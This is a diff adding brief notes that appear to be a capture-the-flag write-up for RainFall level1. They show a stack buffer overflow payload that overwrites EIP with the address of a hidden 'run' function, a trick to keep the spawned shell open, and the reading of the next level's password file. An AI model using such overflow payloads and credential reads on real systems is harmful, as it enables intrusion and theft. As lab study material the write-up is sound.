@@ -1,0 +1,30 @@
+nm level1 
+
+we can see there is two function, main and run 
+
+gdb $ disass main 
+
+... 
+run is not called in the main
+but there is an overflow 
+
+we need to replace the eip with the add of the run fct 
+
+disass run : 
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+
+$  python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]' | ./level1 
+Good... Wait what?
+Segmentation fault (core dumped)
+
+here we nedd to catch the shell : cat <(...) - | ./bin
+
+level1@RainFall:~$ cat <(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1 
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dc[...]
+Segmentation fault (core dumped)
+level1@RainFall:~$ su level2
+
+
